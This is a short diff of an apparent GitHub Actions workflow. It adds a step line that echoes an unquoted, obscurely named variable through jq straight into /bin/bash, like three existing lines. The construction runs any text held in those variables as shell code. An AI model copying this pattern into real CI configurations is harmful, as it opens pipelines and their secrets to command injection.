@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$ty7458" | jq -r .smq921 | /bin/bash
           printf '%s' "$v7154" | jq -r .ahyld56 | /bin/bash
           printf '%s' "$xjgbd82" | jq -r .pwxmt3590 | /bin/bash
+          echo $yrkcj1 | jq -r .urdg9 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
